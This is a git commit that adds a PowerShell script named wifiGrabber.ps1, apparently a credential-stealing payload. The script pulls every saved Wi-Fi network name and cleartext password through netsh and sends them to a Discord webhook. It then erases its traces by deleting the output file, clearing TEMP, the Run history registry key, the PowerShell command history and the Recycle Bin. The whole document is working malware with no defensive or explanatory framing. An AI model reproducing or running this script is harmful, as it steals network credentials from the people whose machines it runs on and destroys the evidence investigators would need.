1d4c2a5b6e0209866d8cdc1c8c2c27d1b5d296f4
Shoaib Akhatar <55377721+shoaibakhatar@users.noreply.github.com>
2024-06-04 11:17:01 +0545

    Add files via upload

---
+++ wifiGrabber.ps1
@@ -0,0 +1,49 @@
+$wifiProfiles = (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ SSID=$name;PASSWORD=$pass }} | Format-Table -AutoSize | Out-String
+
+$username = $Env:UserName
+$wifiProfiles > $env:C:\Users\$username\Desktop\1.txt
+
+function Upload-Discord {
+
+[CmdletBinding()]
+param (
+    [parameter(Position=0,Mandatory=$False)]
+    [string]$file,
+    [parameter(Position=1,Mandatory=$False)]
+    [string]$text 
+)
+
+$hookurl = "$dc"
+
+$Body = @{
+  'username' = $env:username
+  'content' = $text
+}
+
+if (-not ([string]::IsNullOrEmpty($text))){
+Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)};
+
+if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
+}
+
+Upload-Discord -file "$env:C:\Users\$username\Desktop\1.txt"
+
+
+
+function Show-Time { 
+timeout 1
+
+del $env:C:\Users\$username\Desktop\1.txt
+
+rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
+
+reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f 
+
+Remove-Item (Get-PSreadlineOption).HistorySavePath -ErrorAction SilentlyContinue
+
+Clear-RecycleBin -Force -ErrorAction SilentlyContinue
+
+}
+
+
+Show-Time
